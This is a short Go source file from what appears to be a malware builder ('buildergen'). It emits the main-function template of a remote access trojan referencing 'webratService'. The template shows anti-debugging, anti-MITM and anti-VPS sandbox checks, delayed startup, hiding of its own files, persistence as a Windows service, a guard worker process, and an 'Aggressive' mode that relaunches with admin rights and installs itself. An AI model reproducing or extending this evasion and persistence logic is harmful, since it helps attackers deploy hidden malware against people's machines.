package buildergen

import "strings"

func templateMainFlow() string {
	return strings.TrimSpace(`
func main() {
	if isDebuggerPresent() {
		os.Exit(0)
	}

	analysisMode := strings.TrimSpace(antiAnalysisMode)
	if strings.EqualFold(analysisMode, "AntiMitm") || strings.EqualFold(analysisMode, "Full") {
		checkAntiMitm()
	}

	if strings.EqualFold(analysisMode, "AntiVps") || strings.EqualFold(analysisMode, "Full") {
		checkAntiVps()
	}

	applyStartupDelay()

	hideSelfFiles()

	if runtime.GOOS == "windows" {
		isSvc, err := svc.IsWindowsService()
		if err == nil && isSvc {
			_ = svc.Run(getServiceName(), &webratService{})
			return
		}
	}

	if len(os.Args) > 1 && os.Args[1] == "worker" {
		runWorkerGuard()
		return
	}

	forceMode := strings.TrimSpace(forceAdminMode)
	aggressiveMode := strings.EqualFold(forceMode, "Aggressive") || strings.EqualFold(forceMode, "Agressive")

	enforceLock := shouldEnforceBuildLock()
	if enforceLock && !(aggressiveMode && !isAdmin()) && !ensureSingleRunPerBuild() {
		return
	}

	if aggressiveMode {
		if shouldEnforceBuildLock() {
			if isAggressiveAlreadyInstalled() {
				return
			}

			if !isAdmin() {
				relaunchAsAdmin()
				return
			}

			if opInstallAll() {
				return
			}
		}

		runPrimaryWithWorker()
		return
	}

	runPrimaryWithWorker()
}
`)
}
